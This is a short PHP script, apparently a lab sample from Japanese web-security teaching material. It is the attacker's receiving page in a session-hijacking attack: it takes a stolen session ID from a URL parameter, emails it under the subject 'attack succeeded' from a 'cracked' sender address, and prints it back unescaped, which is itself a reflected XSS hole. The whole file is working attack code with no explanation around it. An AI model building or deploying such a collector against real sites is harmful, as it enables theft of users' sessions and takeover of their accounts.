<?php
  mb_language('Japanese');
  $sid = $_GET['sid'];
  mb_send_mail('localhost:8080', '攻撃成功', 'セッションID:' . $sid,
    'From: cracked@localhost:8080');
?>
<body>攻撃成功<br>
<?php echo $sid; ?>
</body>
